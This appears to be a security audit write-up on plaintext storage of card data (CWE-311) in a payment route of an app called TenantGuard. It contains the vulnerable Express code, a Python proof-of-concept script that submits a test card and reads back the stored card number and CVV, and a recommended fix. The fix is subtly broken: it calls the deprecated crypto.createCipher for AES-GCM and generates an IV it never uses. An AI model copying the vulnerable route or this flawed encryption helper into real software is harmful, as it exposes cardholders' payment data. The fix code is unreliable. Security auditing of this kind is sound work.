# Vulnerability: Insecure Payment Gateway

## 1. Vulnerability Name
**CWE-311: Missing Encryption of Sensitive Data**

## 2. Location in Code
- **File:** `backend/src/routes/payment.js` (lines 15-45)
- **File:** `backend/src/models/User.js` (lines 25-35)

```javascript
// payment.js - Unencrypted sensitive data storage
router.post('/process', authenticateToken, async (req, res) => {
    try {
        const { amount, cardNumber, expiryDate, cvv, cardholderName } = req.body;
        
        // Store sensitive payment data in plaintext
        const paymentRecord = {
            amount: amount,
            cardNumber: cardNumber,
            expiryDate: expiryDate,
            cvv: cvv,
            cardholderName: cardholderName,
            timestamp: new Date(),
            status: 'completed'
        };
        
        const user = await User.findById(req.user.id);
        user.paymentHistory.push(paymentRecord);
        await user.save();
        
        res.json({ message: 'Payment processed successfully', paymentId: paymentRecord._id });
    } catch (error) {
        res.status(500).json({ message: 'Payment processing failed' });
    }
});
```

## 3. Technical Root Cause
The payment system stores sensitive financial data (credit card numbers, CVV codes, expiry dates) in plaintext format without encryption. Additionally, there's no input validation, PCI-DSS compliance measures, or secure payment processing protocols.

## 4. Proof of Concept Explanation
1. Login to the application with valid credentials
2. Submit a payment with credit card details
3. Access the user's payment history through the API
4. Observe that all sensitive payment data is stored and returned in plaintext

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_payment_gateway():
    base_url = "http://localhost:5000"
    
    # Login to get token
    login_data = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    token = response.json().get('token')
    
    if not token:
        print("[-] Login failed")
        return False
    
    headers = {"Authorization": f"Bearer {token}"}
    
    # Submit payment with sensitive data
    payment_data = {
        "amount": 99.99,
        "cardNumber": "4532-1234-5678-9012",
        "expiryDate": "12/25",
        "cvv": "123",
        "cardholderName": "John Doe"
    }
    
    print("[+] Submitting payment with sensitive card data...")
    payment_response = requests.post(
        f"{base_url}/api/payment/process",
        headers=headers,
        json=payment_data
    )
    
    if payment_response.status_code == 200:
        print("[+] Payment processed successfully")
        
        # Retrieve payment history to show plaintext storage
        history_response = requests.get(
            f"{base_url}/api/payment/history",
            headers=headers
        )
        
        if history_response.status_code == 200:
            payment_history = history_response.json()
            
            print("[!] PAYMENT VULNERABILITY CONFIRMED")
            print("[+] Sensitive payment data stored in plaintext:")
            
            for payment in payment_history:
                print(f"    Card Number: {payment.get('cardNumber')}")
                print(f"    CVV: {payment.get('cvv')}")
                print(f"    Expiry: {payment.get('expiryDate')}")
                print(f"    Cardholder: {payment.get('cardholderName')}")
                print("    ---")
            
            return True
    
    return False

if __name__ == "__main__":
    exploit_payment_gateway()
```

## 6. Impact
- **Financial Data Breach:** Exposure of credit card numbers, CVV codes, and personal information
- **PCI-DSS Violation:** Non-compliance with payment card industry standards
- **Identity Theft:** Sufficient data for fraudulent transactions
- **Regulatory Penalties:** Severe fines and legal consequences

**CVSS Score:** 9.4 (Critical)

## 7. Fix Recommendation

Implement secure payment processing:

```javascript
// Secure payment implementation
const crypto = require('crypto');

// Use proper payment processor (Stripe, PayPal, etc.)
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);

// Encrypt sensitive data if storage is required
const encryptSensitiveData = (data) => {
    const algorithm = 'aes-256-gcm';
    const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
    const iv = crypto.randomBytes(16);
    
    const cipher = crypto.createCipher(algorithm, key);
    cipher.setAAD(Buffer.from('payment-data'));
    
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
        encrypted,
        iv: iv.toString('hex'),
        authTag: authTag.toString('hex')
    };
};

router.post('/process', authenticateToken, async (req, res) => {
    try {
        const { amount, paymentMethodId } = req.body;
        
        // Use Stripe for secure payment processing
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(amount * 100), // Convert to cents
            currency: 'usd',
            payment_method: paymentMethodId,
            confirm: true
        });
        
        // Store only non-sensitive payment reference
        const paymentRecord = {
            amount: amount,
            stripePaymentId: paymentIntent.id,
            status: paymentIntent.status,
            timestamp: new Date(),
            // Never store card details
        };
        
        const user = await User.findById(req.user.id);
        user.paymentHistory.push(paymentRecord);
        await user.save();
        
        res.json({ 
            message: 'Payment processed successfully', 
            paymentId: paymentRecord._id,
            clientSecret: paymentIntent.client_secret
        });
    } catch (error) {
        res.status(500).json({ message: 'Payment processing failed' });
    }
});

// Input validation middleware
const validatePaymentInput = (req, res, next) => {
    const { amount } = req.body;
    
    if (!amount || amount <= 0 || amount > 10000) {
        return res.status(400).json({ message: 'Invalid payment amount' });
    }
    
    next();
};
```